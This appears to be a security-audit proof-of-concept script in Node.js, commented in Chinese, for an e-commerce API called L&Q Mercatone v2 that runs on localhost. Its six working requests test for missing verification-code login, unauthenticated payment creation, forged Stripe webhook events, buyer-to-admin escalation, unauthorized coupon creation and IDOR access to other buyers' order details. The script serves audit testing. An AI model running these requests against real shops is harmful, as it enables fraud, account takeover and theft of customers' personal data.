/**
 * L&Q Mercatone v2 — 安全审计 POC 脚本
 * 所有 POC 均基于代码分析，可在服务启动后直接运行
 *
 * 使用方法：
 * 1. 启动后端服务: cd apps/api && npm run start:dev
 * 2. 运行本脚本: node tests/security-poc.js
 */

const BASE_URL = process.env.API_URL || 'http://localhost:3001/api/v1';

// ============================================================
// POC #1: 买家登录无需验证码 — 任意手机号直接获取 JWT
// ============================================================
async function poc1_noVerificationCodeLogin() {
  console.log('\n========== POC #1: 买家登录无需验证码 ==========');

  const phone = '+39' + Math.floor(100000000 + Math.random() * 900000000);

  try {
    const res = await fetch(`${BASE_URL}/auth/phone-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone }),
    });
    const data = await res.json();

    if (data.accessToken) {
      console.log('✅ 漏洞确认！');
      console.log(`   手机号: ${phone}`);
      console.log(`   Token: ${data.accessToken.substring(0, 30)}...`);
      console.log(`   角色: ${data.user?.role}`);
      console.log('   攻击者可以用任意手机号直接登录，无需验证码');
      return { confirmed: true, token: data.accessToken, phone };
    } else {
      console.log('❌ 登录失败:', data.error);
      return { confirmed: false };
    }
  } catch (e) {
    console.log('⚠️ 服务未启动或网络错误:', e.message);
    return { confirmed: false, error: e.message };
  }
}

// ============================================================
// POC #2: createPaymentIntent 无鉴权 — 未登录可创建支付
// ============================================================
async function poc2_unauthenticatedPaymentIntent() {
  console.log('\n========== POC #2: createPaymentIntent 无鉴权 ==========');

  try {
    // 不携带任何 Token
    const res = await fetch(`${BASE_URL}/payment/create-intent`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ orderId: 'non-existent-order-id' }),
    });
    const data = await res.json();

    if (res.status === 200 || res.status === 201) {
      console.log('✅ 漏洞确认！未登录即可调用支付接口');
      console.log('   响应:', JSON.stringify(data).substring(0, 100));
      return { confirmed: true };
    } else if (res.status === 401 || res.status === 403) {
      console.log('❌ 接口有鉴权保护:', res.status);
      return { confirmed: false };
    } else {
      console.log('⚠️ 其他状态:', res.status, data);
      return { confirmed: false };
    }
  } catch (e) {
    console.log('⚠️ 服务未启动:', e.message);
    return { confirmed: false, error: e.message };
  }
}

// ============================================================
// POC #3: Webhook 签名校验可绕过 — 空密钥时伪造支付
// ============================================================
async function poc3_webhookSignatureBypass() {
  console.log('\n========== POC #3: Webhook 签名校验绕过 ==========');

  try {
    // 伪造一个支付成功的 Webhook 事件
    const fakeEvent = {
      type: 'payment_intent.succeeded',
      data: {
        object: {
          id: 'pi_fake_123456',
          metadata: { orderId: 'any-order-id' },
          amount_received: 100, // 只付了 €1.00
        },
      },
    };

    const res = await fetch(`${BASE_URL}/payment/webhook`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'stripe-signature': 'fake_signature',
      },
      body: JSON.stringify(fakeEvent),
    });
    const data = await res.json();

    if (res.status === 200 && data.received) {
      console.log('✅ 漏洞确认！Webhook 接受伪造签名');
      console.log('   攻击者可以伪造支付成功事件');
      return { confirmed: true };
    } else if (res.status === 400) {
      console.log('❌ Webhook 签名校验有效:', data.error);
      return { confirmed: false };
    } else {
      console.log('⚠️ 其他响应:', res.status, data);
      return { confirmed: false };
    }
  } catch (e) {
    console.log('⚠️ 服务未启动:', e.message);
    return { confirmed: false, error: e.message };
  }
}

// ============================================================
// POC #4: 管理员注册无角色守卫 — 买家可创建管理员
// ============================================================
async function poc4_privilegeEscalation(token) {
  console.log('\n========== POC #4: 买家提升为管理员 ==========');

  if (!token) {
    console.log('⚠️ 无 Token，跳过');
    return { confirmed: false };
  }

  try {
    const res = await fetch(`${BASE_URL}/auth/register-admin`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`,
      },
      body: JSON.stringify({
        phone: '+39999888777',
        password: 'hacked123',
        name: 'Hacked Admin',
        role: 'ADMIN',
      }),
    });
    const data = await res.json();

    if (res.status === 201 || res.status === 200) {
      console.log('✅ 漏洞确认！买家可直接创建管理员账号');
      console.log('   新管理员:', data.user);
      return { confirmed: true };
    } else if (res.status === 403) {
      console.log('❌ 有角色守卫:', data.error);
      return { confirmed: false };
    } else {
      console.log('⚠️ 其他响应:', res.status, data);
      return { confirmed: false };
    }
  } catch (e) {
    console.log('⚠️ 服务未启动:', e.message);
    return { confirmed: false, error: e.message };
  }
}

// ============================================================
// POC #5: 优惠券创建无角色校验 — 买家可创建优惠券
// ============================================================
async function poc5_unauthorizedCouponCreation(token) {
  console.log('\n========== POC #5: 买家创建优惠券 ==========');

  if (!token) {
    console.log('⚠️ 无 Token，跳过');
    return { confirmed: false };
  }

  try {
    const res = await fetch(`${BASE_URL}/coupons/admin/create`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`,
      },
      body: JSON.stringify({
        code: 'FREE100',
        type: 'NO_THRESHOLD',
        valueCent: 10000,
        minOrderCent: 0,
        startsAt: '2020-01-01T00:00:00Z',
        endsAt: '2030-12-31T23:59:59Z',
      }),
    });
    const data = await res.json();

    if (res.status === 201 || res.status === 200) {
      console.log('✅ 漏洞确认！买家可创建 €100 无门槛优惠券');
      console.log('   优惠券:', data);
      return { confirmed: true };
    } else if (res.status === 403) {
      console.log('❌ 有角色守卫:', data.error);
      return { confirmed: false };
    } else {
      console.log('⚠️ 其他响应:', res.status, data);
      return { confirmed: false };
    }
  } catch (e) {
    console.log('⚠️ 服务未启动:', e.message);
    return { confirmed: false, error: e.message };
  }
}

// ============================================================
// POC #6: 订单详情无归属校验 — IDOR 查看他人订单
// ============================================================
async function poc6_orderIdor(token, victimOrderId) {
  console.log('\n========== POC #6: 订单详情 IDOR ==========');

  if (!token) {
    console.log('⚠️ 无 Token，跳过');
    return { confirmed: false };
  }

  try {
    const res = await fetch(`${BASE_URL}/orders/${victimOrderId}`, {
      headers: { 'Authorization': `Bearer ${token}` },
    });
    const data = await res.json();

    if (res.status === 200) {
      console.log('✅ 漏洞确认！可查看他人订单详情');
      console.log('   收货人:', data.receiverName);
      console.log('   电话:', data.receiverPhone);
      console.log('   地址:', data.shippingAddress);
      return { confirmed: true };
    } else {
      console.log('❌ 有归属校验:', res.status);
      return { confirmed: false };
    }
  } catch (e) {
    console.log('⚠️ 服务未启动:', e.message);
    return { confirmed: false, error: e.message };
  }
}

// ============================================================
// 运行所有 POC
// ============================================================
async function runAll() {
  console.log('╔══════════════════════════════════════════════╗');
  console.log('║  L&Q Mercatone v2 安全审计 POC 测试          ║');
  console.log('╚══════════════════════════════════════════════╝');
  console.log(`目标: ${BASE_URL}`);

  const results = {};

  // POC 1
  const poc1 = await poc1_noVerificationCodeLogin();
  results.poc1 = poc1;

  // POC 2
  const poc2 = await poc2_unauthenticatedPaymentIntent();
  results.poc2 = poc2;

  // POC 3
  const poc3 = await poc3_webhookSignatureBypass();
  results.poc3 = poc3;

  // POC 4-6 需要 Token
  if (poc1.confirmed) {
    const poc4 = await poc4_privilegeEscalation(poc1.token);
    results.poc4 = poc4;

    const poc5 = await poc5_unauthorizedCouponCreation(poc1.token);
    results.poc5 = poc5;

    const poc6 = await poc6_orderIdor(poc1.token, 'test-order-id');
    results.poc6 = poc6;
  }

  // 汇总
  console.log('\n╔══════════════════════════════════════════════╗');
  console.log('║  审计结果汇总                                  ║');
  console.log('╚══════════════════════════════════════════════╝');

  Object.entries(results).forEach(([name, result]) => {
    const status = result.confirmed ? '✅ 已确认' : result.confirmed === false ? '❌ 未确认' : '⚠️ 跳过';
    console.log(`  ${name}: ${status}`);
  });

  const confirmed = Object.values(results).filter(r => r.confirmed).length;
  const total = Object.keys(results).length;
  console.log(`\n  总计: ${confirmed}/${total} 个漏洞已确认`);

  return results;
}

runAll().catch(console.error);
